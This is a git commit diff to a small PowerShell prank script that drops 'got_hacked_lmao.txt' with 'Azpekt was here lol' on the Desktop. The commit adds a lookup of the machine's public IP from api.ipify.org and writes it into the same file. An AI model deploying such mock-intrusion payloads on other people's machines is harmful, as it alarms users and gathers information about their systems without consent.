537a25dee3d9a234990dd398a34e94af65ac2074
AzpektDev <eryk.janiczek@gmail.com>
2023-01-20 23:11:01 +0100

    add ip to file

--- script.ps1
+++ script.ps1
@@ -1,2 +1,4 @@
 $dir = [Environment]::GetFolderPath("Desktop")
-New-Item -Path $dir -Name "got_hacked_lmao.txt" -Value "Azpekt was here lol"
+$public_ip = (Invoke-WebRequest -uri "https://api.ipify.org/").Content
+New-Item -Path $dir -Name "got_hacked_lmao.txt" -Value "Azpekt was here lol `n"
+Add-Content -Path $dir\got_hacked_lmao.txt -Value $public_ip
